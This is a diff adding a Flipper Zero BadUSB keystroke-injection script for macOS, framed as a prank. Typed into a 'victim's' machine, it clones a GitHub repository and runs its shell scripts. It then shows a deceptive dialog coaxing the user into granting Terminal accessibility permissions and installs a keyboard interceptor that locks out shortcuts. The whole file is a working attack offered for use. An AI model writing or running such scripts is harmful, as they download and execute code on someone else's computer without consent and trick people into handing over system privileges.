@@ -1,0 +1,56 @@
+REM Hacker Terminal with Keyboard Interceptor - Flipper Zero BadUSB script
+REM This script installs and runs the hacker terminal with keyboard interceptor
+REM For maximum pranking effect - blocks keyboard shortcuts from working
+REM Target: macOS systems
+
+REM Open Terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Clone the repository
+STRING git clone https://github.com/Gr3y-foX/linux_hacker_theme_video.git /tmp/hacker_terminal
+DELAY 500
+ENTER
+DELAY 3000
+
+REM Navigate to the directory
+STRING cd /tmp/hacker_terminal
+DELAY 300
+ENTER
+DELAY 500
+
+REM Install dotnet if needed (using Homebrew)
+STRING brew install --cask dotnet-sdk
+DELAY 300
+ENTER
+DELAY 10000
+
+REM Run keyboard interceptor setup
+STRING chmod +x setup_keyboard_interceptor.sh && ./setup_keyboard_interceptor.sh
+DELAY 300
+ENTER
+DELAY 5000
+
+REM Navigate to Security & Privacy settings (for accessibility permissions)
+STRING open x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility
+DELAY 300
+ENTER
+DELAY 3000
+
+REM Tell victim to enable Terminal in accessibility settings
+STRING osascript -e 'display dialog "Click the lock to make changes and check the box next to Terminal to grant accessibility permissions. Then click Close and return to the Terminal window." with title "Hacker Terminal Setup" buttons {"OK"} default button 1 with icon caution'
+DELAY 300
+ENTER
+DELAY 10000
+
+REM Run with keyboard interception
+STRING ./run_with_intercept.sh
+DELAY 300
+ENTER
+
+REM Done! The victim won't be able to use keyboard shortcuts to exit
+REM They will need to know the special Ctrl+Shift+X sequence to exit
